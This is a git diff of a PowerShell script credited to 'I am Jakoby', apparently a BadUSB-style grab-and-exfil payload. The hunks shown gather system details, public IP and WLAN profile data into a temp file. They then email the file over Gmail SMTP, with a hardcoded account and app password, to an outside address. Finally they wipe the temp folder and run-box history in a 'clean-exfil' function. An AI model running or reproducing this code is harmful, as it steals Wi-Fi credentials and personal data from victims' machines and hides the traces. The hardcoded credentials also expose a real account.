@@ -1,3 +1,7 @@
+## I'm new to this and forgot to fork instead of retrieving the file
+## Major part of this script has been made by Github user "I am Jakoby" : https://github.com/I-Am-Jakoby
+
+New-Item $Env:temp\foo.txt -type File
 <#
 
 .NOTES  
@@ -122,8 +126,6 @@ if ($PubIP) { echo "`nYour Public IP: $PubIP" >> $Env:temp\foo.txt }
     $pls = $pls.Substring($plsPOS+2).Trim()
     $pls = $pls -replace ".{3}$"
     $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
-    $DateArray =$time.Split(".")
-    $days = [int]$DateArray[0]
     return $pls
     
     }
@@ -194,16 +196,13 @@ Foreach($WLANProfileName in $WLANProfileNames){
 $content = [IO.File]::ReadAllText("$Env:temp\foo.txt")
 	}
 
-
-$Env:temp\foo.txt
-
-$PWord = ConvertTo-SecureString -String "xbtrisekjfbduddf" -ASPlainText -Force
+$PWord = ConvertTo-SecureString -String "rcotbisuqqikfaqc" -ASPlainText -Force
 $User = "trashmail4demos@gmail.com"
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $PWord
 
-Send-MailMessage -Attachments $Env:temp\foo.txt -Body 'Jette un coup d'oeil à la pièce jointe' -From $Credential.UserName -To "fleurin556@headmind.com" -SMTPServer smtp.gmail.com -UseSSL -Subject Test -Credential $Credential
+Send-MailMessage -Attachments $Env:temp\foo.txt -Body 'Jette un coup doeil à la pièce jointe' -From $Credential.UserName -To "fleurin556@headmind.com" -SMTPServer smtp.gmail.com -UseSSL -Subject Test -Port 587 -Credential $Credential
 
-rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
+Remove-Item $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
 
@@ -217,7 +216,7 @@ function clean-exfil {
 try {
 # Delete contents of Temp folder 
 
-	rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+	Remove-Item $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
 
